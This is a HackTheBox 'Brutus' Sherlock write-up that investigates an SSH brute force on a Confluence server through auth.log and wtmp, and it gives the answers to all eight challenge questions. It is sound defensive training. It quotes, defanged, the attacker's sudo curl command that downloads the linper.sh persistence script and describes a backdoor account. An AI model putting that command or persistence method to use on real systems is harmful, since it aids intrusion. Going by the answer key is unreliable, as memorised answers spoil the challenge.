# Brutus – SSH Brute Force Investigation Using auth.log & wtmp

## HackTheBox

## Scenario

In this Sherlock challenge, we investigate a compromised Confluence server that was brute-forced through its SSH service. After successfully gaining access, the attacker performed multiple post-exploitation activities. Using Unix `auth.log` and `wtmp` logs, we analyze login attempts, identify successful authentication, trace privilege escalation, detect persistence mechanisms, and uncover attacker activity on the system. 

## Alert

Multiple failed SSH login attempts detected against the Confluence server, followed by a successful login from the same external IP address. Suspicious privilege escalation and new session activity observed in `auth.log` and `wtmp`, indicating potential unauthorized access and persistence.

---

## Challenge Questions

1.Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

The Brute force attempted on the SSH. So we have to filter the auth.log file by the command that Accepted the password , that allowed the attacker to login in SSH on different ports and Users.

Successfully gained access on Root and Cyberjunkie  

```jsx
cat auth.log | grep -i 'Accepted'
```

<img width="852" height="134" alt="Screenshot 2026-02-20 142132" src="https://github.com/user-attachments/assets/b4a69251-a415-489d-8ece-dd1475ba3f6a" />

Answer: 65.2.161.68

---

2.The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

The attacker gained the root access on the server by Brute forcing the SSH 

<img width="912" height="119" alt="Screenshot 2026-02-20 143849" src="https://github.com/user-attachments/assets/8736ed3c-b908-4077-a16b-de0277a024ff" />

Answer: root

---

3.Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.

There is a file called wtmp, it contains full timestamp detail where auth.log have only month, day, Time. But we need a year-month-day and timestamp. 

I have used command utmpdump:

- The `utmpdump` command is a Linux utility used to display the contents of system audit log files (`utmp`, `wtmp`, and `btmp`) in a readable, raw ASCII format. These log files are binary files that track user login/logout history, system reboots, and failed login attempts.

We know that the attacker IP is 65.2.161.68

<img width="894" height="436" alt="Screenshot 2026-02-20 145209" src="https://github.com/user-attachments/assets/e05230d2-1d6e-40f1-ae36-b9528dd46c96" />

I have confirmed it with the Timestamp in 06:32:44

<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/f6a8a40e-d6e5-4e81-bc71-225e38d878f4" />

Answer: 2024-03-06 06:32:45

---

4.SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

I have used grep command to filter by session, And the attacker gained access of root also i used another grep command to filter it out.

<img width="901" height="306" alt="Screenshot 2026-02-20 152013" src="https://github.com/user-attachments/assets/5fae330c-7448-4ff0-83a8-3270bfcd089e" />

I have confirmed by checking with the timestamp, the attacker gained the access on 06:32:44 by looking at this 

<img width="764" height="105" alt="Screenshot 2026-02-20 145353" src="https://github.com/user-attachments/assets/26aa01e7-120b-44cf-9d4d-ab0ab8d94f17" />

Answer: 37

---

5.The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Previously we have found a user cyberjunkie where the passwords where accepted 
<img width="767" height="102" alt="Screenshot 2026-02-20 152616" src="https://github.com/user-attachments/assets/be69aa47-24de-4541-92b4-7d64b8b720c2" />

I have used this grep to find the log details about the cyberjunkie

<img width="960" height="283" alt="Screenshot 2026-02-20 152809" src="https://github.com/user-attachments/assets/1bc821fa-7235-4e92-822d-c475e8ebbe87" />

On 06:34:18 the attacker created and added to group

Answer: cyberjunkie

---

6.What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

In the MITRE ATT&CK official site we can check out the technique and sub-techniques about the attacker next move. We know that attacker is moving persistence technique.

<img width="960" height="480" alt="Screenshot 2026-02-20 155256" src="https://github.com/user-attachments/assets/c65bf9d2-2046-4b1c-8130-39f875ba84b0" />

Answer: T1136.001

---

7.What time did the attacker's first SSH session end according to auth.log?

In the question they have asked yyyy-mm-dd but the auth.log contains only month,day and time.

I have used utmpdump wtmp to view the full timestamp

<img width="960" height="425" alt="Screenshot 2026-02-20 160314" src="https://github.com/user-attachments/assets/561d9cf9-e442-48a4-b320-e2c5ec95dac1" />

This was the timestamp recorded that SSH session ended 

Answer: 2024-03-06 06:37:24

---

8.The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

We know that attacker is now using the user name cyberjunkie so i filtered that using the command.

The attacker just installed the backdoor script using the curl command. 

```jsx
cat auth.log | grep -i 'cyberjunkie'
```

<img width="960" height="309" alt="Screenshot 2026-02-20 161015" src="https://github.com/user-attachments/assets/05db65c7-2f3b-489a-9613-7f3e360954c3" />

Answer: /usr/bin/curl hxxps[://]raw[.]githubusercontent[.]com/montysecurity/linper/main/linper[.]sh

---

<img width="591" height="212" alt="Screenshot 2026-02-20 161428" src="https://github.com/user-attachments/assets/de6a474a-d846-49e3-b9c8-673ec495354b" />

---
# MITRE ATT&CK Mapping

| ATT&CK Stage | Technique ID | Technique |
| --- | --- | --- |
| Reconnaissance | - | - |
| Resource Development | - | - |
| Initial Access | T1110.001 | Brute Force: Password Guessing |
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell |
| Persistence | T1136.001 | Create Account: Local Account |
| Privilege Escalation | T1078 | Valid Accounts |
| Defense Impairment | - | - |
| Credential Access | T1110.001 | Brute Force: Password Guessing |
| Discovery | - | - |
| Lateral Movement | - | - |
| Collection | - | - |
| Command and Control | - | - |
| Exfiltration | - | - |
| Impact | - | - |

### DONE BY

#### RUTHRAN-SEC
